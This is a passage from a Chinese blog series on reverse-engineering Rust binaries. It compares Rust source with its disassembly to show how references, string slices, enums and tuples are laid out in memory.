<h1 id="reverse-for-references-and-borrows"><a class="markdownIt-Anchor" href="#reverse-for-references-and-borrows"></a> Reverse for References and Borrows</h1>
<p>引用和借用是Rust的重要特性，它允许一个变量在不获取所有权、不转移所有权的前提下使用某个变量。借用指的是通过引用传递参数给函数的方法。既然涉及函数传参，那么下面我们就来通过一个函数调用的示例对Rust的引用与借用进行源码和汇编层面的分析。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_len</span>(s: &amp;<span class="type">String</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;the length of the string &#123;&#125; is: &#123;&#125;&quot;</span>, s, s.<span class="title function_ invoke__">len</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_len</span>(&amp;x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是<code>main</code>函数的部分反编译结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 56</span><br><span class="line">lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">lea     rdi, [rsp + 16]</span><br><span class="line">mov     qword ptr [rsp + 8], rdi</span><br><span class="line">mov     edx, 5</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">mov     rdi, qword ptr [rsp + 8]</span><br><span class="line">call    example::print_len</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>main</code>函数直接将<code>x</code>的内存地址，即保存<code>String</code>实例地址的地址传递给<code>print_len</code>函数。这样子函数只需要通过获取该地址即可完成后续操作。</p>
<p>但是转念一想，如果子函数的参数不是引用，只是单纯的<code>String</code>，汇编代码层又会有什么不同呢？这样的例子总是存在的，当一个结构体非常庞大时，如果只通过寄存器与栈传递参数，未免有点太不优雅了。下面是将参数修改为<code>String</code>后<code>main</code>函数的部分反编译结果：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, <span class="number">56</span></span><br><span class="line">lea     rdi, [rsp + <span class="number">8</span>]</span><br><span class="line">lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">mov     edx, <span class="number">5</span></span><br><span class="line">call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">32</span>], rax</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">16</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">40</span>], rax</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">48</span>], rax</span><br><span class="line">lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">call    example::print_len</span><br></pre></td></tr></table></figure>
<p>可以看到，这里实际上传递到<code>print_len</code>函数的参数依然只有1个，但不同的是，<code>main</code>函数首先将<code>String</code>实例在栈上复制了一份，然后将复制那份的地址传了过去。另外，对于实例的删除位置不同，这是由Rust语言特性所决定的，不加引用意味着变量的所有权被转移到了子函数中，删除操作将在子函数中进行；加引用则所有权不转移，删除操作将在父函数中进行。不加引用的父函数操作与移动非常相似，只不过是没有将复制出来的实例地址放到栈的某处。想来其实也很合理，不加引用实际上就是完成了所有权的移动嘛。</p>
<h1 id="reverse-for-string-slices"><a class="markdownIt-Anchor" href="#reverse-for-string-slices"></a> Reverse for String Slices</h1>
<p>在Rust中，存在与Python类似的切片类型Slice，对于字符串而言，字符串字面量也可以看做是一个字符串切片。</p>
<p>考虑下面的Rust代码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;I&#x27;m CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">4</span>..];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其部分反编译结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 184</span><br><span class="line">lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 16], rdi</span><br><span class="line">mov     edx, 9</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">mov     rdi, qword ptr [rsp + 16]</span><br><span class="line">mov     qword ptr [rsp + 80], 4</span><br><span class="line">mov     rsi, qword ptr [rsp + 80]</span><br><span class="line">lea     rdx, [rip + .L__unnamed_6]</span><br><span class="line">call    &lt;alloc::string::String as core::ops::index::Index&lt;core::ops::range::RangeFrom&lt;usize&gt;&gt;&gt;::index</span><br><span class="line">mov     qword ptr [rsp + 24], rdx</span><br><span class="line">mov     qword ptr [rsp + 32], rax</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>String</code>实例指针，即变量<code>x</code>被保存在<code>[rsp+16]</code>的位置，随后程序调用了一个<code>core::ops::index::Index&lt;core::ops::range::RangeFrom&lt;usize&gt;&gt;&gt;::index</code>方法，实际上也就是从字符串中获取切片的方法。该方法的参数按顺序依次为：<code>String</code>实例指针、切片的起始索引值、另外一个字符串切片，这第三个参数指向的是保存工程名的字符串，可以忽略。如果将Rust源码的<code>[4..]</code>改为<code>[4..7]</code>，会发现第三个参数变成了7，函数名变成了<code>Range</code>，如果是<code>[..4]</code>，则函数名为<code>RangeTo</code>，传参与<code>[4..]</code>完全相同。由此可见字符串取切片实际上有3个方法控制。返回值由两个寄存器传递，<code>rdx</code>保存的是长度，<code>rax</code>保存的是字符串指针。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文按照Rust权威指南的讲解顺序，向后学习了：</p>
<ol>
<li>变量隐藏在汇编层中的表现，隐藏后变量值不变</li>
<li>数组变量在汇编层的数据结构，与C类似</li>
<li>变量移动在汇编层与变量隐藏类似</li>
<li>字符串切片相关操作在汇编层的实现</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/20/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">Rust逆向学习 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-20 10:18:28" itemprop="dateCreated datePublished" datetime="2023-10-20T10:18:28+08:00">2023-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-10-22 16:57:52" itemprop="dateModified" datetime="2023-10-22T16:57:52+08:00">2023-10-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上一篇文章中，我们比较完美地完成了第一次Rust ELF的逆向工作，但第一次编写的Rust程序毕竟只使用了非常有限的几种Rust特性，Rust还有很多的东西没有涉及，像是流程控制、泛型、Trait等。这些内容我们将在本文以及以后的文章中一一进行学习与探索。</p>
<h1 id="guess-a-number"><a class="markdownIt-Anchor" href="#guess-a-number"></a> Guess a number</h1>
<h2 id="0x01-guess-a-number-part-1"><a class="markdownIt-Anchor" href="#0x01-guess-a-number-part-1"></a> 0x01. Guess a number .part 1</h2>
<p>本文从一个跳跃不是很大的程序开始，也就是一个真正的猜数字小程序：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::cmp::Ordering;</span><br><span class="line"><span class="keyword">use</span> std::io;    <span class="comment">// prelude</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng;  <span class="comment">// trait</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">secret</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>, <span class="number">101</span>);    <span class="comment">// ThreadRng: random number generator</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Please guess a number between 1 and 100:&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">            .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Cannot read a line!&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Your guess is: &#123;&#125;&quot;</span>, guess);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = <span class="keyword">match</span> guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>() &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="keyword">continue</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret)&#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small.&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too large.&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123; </span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;You win.&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要注意，使用上一篇文章中的<a target="_blank" rel="noopener" href="https://godbolt.org/">编译工具网站</a>时需要添加库并在代码中通过<code>extern crate rand</code>手动加载rand库，否则会编译失败。</p>
<p>考虑到效率问题，本文对于上述代码的反汇编以IDA的反汇编结果为主，汇编代码分析为辅。</p>
<p><img src="1.png" alt="" /></p>
<h3 id="line-1"><a class="markdownIt-Anchor" href="#line-1"></a> line 1</h3>
<p>第一行中<code>thread_rng</code>方法返回<code>ThreadRng</code>实例，也就是使用于单个线程的随机数产生器实例，随后将其作为参数1（即self），参数2和参数3分别为范围的下界和上界。通过汇编代码可以发现，<code>Range</code>这个对象需要两个寄存器传递。通过查看Rust官方库源码也可以发现，<code>Range</code>实际上也就只有开始和结尾这两个属性值：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Range</span>&lt;Idx&gt; &#123;</span><br><span class="line">    <span class="comment">/// The lower bound of the range (inclusive).</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;rust1&quot;</span>, since = <span class="string">&quot;1.0.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> start: Idx,</span><br><span class="line">    <span class="comment">/// The upper bound of the range (exclusive).</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;rust1&quot;</span>, since = <span class="string">&quot;1.0.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> end: Idx,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>gen_range</code>方法以常规的方式使用<code>rax</code>返回了生成的随机数值。</p>
<p>随后，一个<code>drop_in_place</code>直接删除了<code>ThreadRng</code>实例，可见Rust对于生命周期的管理非常严格，后续代码已经没有使用<code>ThreadRng</code>实例的代码，因此Rust直接就将其删除了，尽最大可能减少对象重用与悬垂指针引用的可能。</p>
<h3 id="loop"><a class="markdownIt-Anchor" href="#loop"></a> loop</h3>
<p>在Rust的反汇编界面中，<code>continue</code>很少见到，因为对于一个循环而言，其内部很有可能存在生命周期在循环之内的对象，因此即使Rust代码中写<code>continue</code>，Rust也需要首先将循环中创建的对象删除之后再开始新一轮循环。这也就导致IDA的反汇编界面中可能会出现很多<code>goto</code>。</p>
<h3 id="line-3~7"><a class="markdownIt-Anchor" href="#line-3~7"></a> line 3~7</h3>
<p><code>println!</code>的特征很好识别，<code>Arguments::new_v1</code>和<code>_print</code>一出，就知道肯定又是一次输出，不过输出的具体字符串内容直接查看反汇编界面无法确定，不过在汇编代码中也很好找。随后的<code>String::new</code>等也非常正常。</p>
<h3 id="match"><a class="markdownIt-Anchor" href="#match"></a> match</h3>
<p>上述代码一共有两个<code>match</code>语句，第一个是将字符串<code>parse</code>的结果进行判断，替换了上一篇文章中的<code>expect</code>。这里<code>parse</code>函数的返回值是一个枚举对象<code>Result&lt;F, F::Err&gt;</code>。我们知道Rust的枚举对象是一个很强大的结构，比C/C++中的枚举对象好用很多，这是因为Rust的枚举对象可以理解成一个Key有限且确定的Map，选择一个Key之后还能够根据Key指定的数据类型自由设置Value。在这里我们不妨研究一下，Rust中的枚举对象是如何组织的。</p>
<h2 id="0x02-reverse-for-enum"><a class="markdownIt-Anchor" href="#0x02-reverse-for-enum"></a> 0x02. Reverse for enum</h2>
<p>下面通过一个简单的程序对枚举类型进行逆向分析。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Freshman</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Sophomore</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Junior</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Senior</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">get_student</span>(grade: <span class="type">i32</span>, name: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;Student&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> grade &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Freshman</span>(name)),</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Sophomore</span>(name)),</span><br><span class="line">        <span class="number">3</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Junior</span>(name)),</span><br><span class="line">        <span class="number">4</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(name)),</span><br><span class="line">        _ =&gt; <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>()).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码定义了一个枚举类型。首先来看<code>get_student</code>方法：</p>
<p><img src="2.png" alt="" /></p>
<p>可以看到，在反汇编界面中，IDA将<code>match</code>语句识别为<code>switch</code>语句，通过汇编代码的分析也能够很容易地发现<strong>跳表</strong>的存在。</p>
<p><img src="3.png" alt="" /></p>
<p>通过查看main函数的方法调用，可以获得<code>get_student</code>方法的参数分别为：<code>Student</code>对象指针、<code>grade</code>参数、<code>name</code>参数。在<code>switch</code>语句中，我们发现每一个分支都有大量的值传送指令，含义未知，但我们可以通过函数调用前后获取到枚举类型的大小与内容。</p>
<p><img src="4.png" alt="" /></p>
<p>经过分析，获取到了枚举对象的内容如上图所示。从函数内容等处可以推断出，枚举对象的第一个值3表示的是枚举对象<code>grade</code>的关键字索引，这里由于返回的是<code>Student::Senior</code>，索引为3，也即枚举对象中的4个索引值对应了0、1、2、3这4个索引值。后面还有3个值，其中有字符串指针和字符串长度，经过测试发现，<code>String</code>对象占0x18大小内存，偏移0x8为字符串指针，偏移0和0x10均为字符串长度。</p>
<p>之后，笔者修改了<code>Student</code>枚举类型的定义，在每一项后面加上了一个<code>i32</code>，经过调试发现枚举类型的属性偏移如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0         枚举索引</span><br><span class="line">0x4         i32</span><br><span class="line">0x8~0x20    String</span><br></pre></td></tr></table></figure>
<p>位于后面的<code>i32</code>类型反而在内存中更加靠前了。笔者推测这可能与Rust对<code>tuple</code>的内存排布有关，考虑到枚举索引很少有超过1个字节（不然就意味着有超过255个分支），使用后面4个字节能节省一定的内存空间。不过无论<code>tuple</code>是如何排布的，Rust的枚举类型在内存中的布局现在已经很清楚了，就是<font color=red><strong>索引值+内容</strong></font>。</p>
<p>不过既然都已经看到了<code>tuple</code>的不寻常，接下来不妨也对其进行一番研究。</p>
<h2 id="0x03-reverse-for-tuple"><a class="markdownIt-Anchor" href="#0x03-reverse-for-tuple"></a> 0x03. Reverse for Tuple</h2>
<p>下面将尝试通过数个Tuple的反编译结果分析Tuple的内存布局。众所周知，Tuple就是若干个数据的集合，这些数据之间没有什么明确的关联，只有一个Tuple将它们约束在一个集合中。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="type">String</span>::<span class="title function_ invoke__">new</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上述代码逆向的结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 72</span><br><span class="line">        lea     rdi, [rsp + 48]</span><br><span class="line">        call    alloc::string::String::new</span><br><span class="line">        mov     dword ptr [rsp], 2</span><br><span class="line">        mov     dword ptr [rsp + 4], 3</span><br><span class="line">        mov     dword ptr [rsp + 8], 5</span><br><span class="line">        mov     dword ptr [rsp + 12], 7</span><br><span class="line">        mov     dword ptr [rsp + 16], 11</span><br><span class="line">        mov     rax, qword ptr [rsp + 48]</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp + 40], rax</span><br><span class="line">        mov     rdi, rsp</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;(i32,i32,i32,i32,i32,alloc::string::String)&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 72</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>从相对于<code>rsp</code>的偏移量可以看出Tuple的排布情况，上述Tuple的内存排布顺序与数据的定义顺序相同。</p>
<p>但对于下面一个Tuple而言就不同了：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="type">String</span>::<span class="title function_ invoke__">new</span>(), <span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逆向的结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 88</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        call    alloc::string::String::new</span><br><span class="line">        mov     dword ptr [rsp + 24], 2</span><br><span class="line">        mov     dword ptr [rsp + 28], 3</span><br><span class="line">        mov     dword ptr [rsp + 32], 5</span><br><span class="line">        mov     dword ptr [rsp + 36], 7</span><br><span class="line">        mov     dword ptr [rsp + 40], 11</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        lea     rax, [rip + .L__unnamed_1]</span><br><span class="line">        mov     qword ptr [rsp + 48], rax</span><br><span class="line">        mov     qword ptr [rsp + 56], 5</span><br><span class="line">        mov     rdi, rsp</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;(i32,i32,i32,i32,i32,alloc::string::String,&amp;str)&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 88</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到，这里是将<code>String::new()</code>产生的<code>String</code>实例放在了开头，随后才是5个<code>i32</code>，最后是<code>&amp;str</code>。至于为什么要这样排列，询问了一个Rust大手子之后，给到的答案是：Rust数据结构和内存排布没有必然关联，Rust编译器可能根据不同的架构进行相应的内存结构调整，说人话就是——<font color=red><strong>不能预判，不是必然顺序排列</strong></font>。不过考虑到对于Tuple的遍历、索引等操作在代码中都是固定的，编译器在编译的时候完全可以将地址偏移与索引值一一对应，不影响正常的索引，但对于反编译则是一个巨大的噩梦，因为你不确定某个索引值的数据到底有多少偏移。另外，如何通过汇编代码对栈空间的布局判断是否存在一个tuple也是一个问题。在定义变量时，一个tuple完全可以拆分为多个变量进行定义，反正在汇编代码中也不会保存临时变量的变量名。这在内存中会表现出来不同吗？</p>
<p>我们还是通过实际验证来解答我们的问题。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
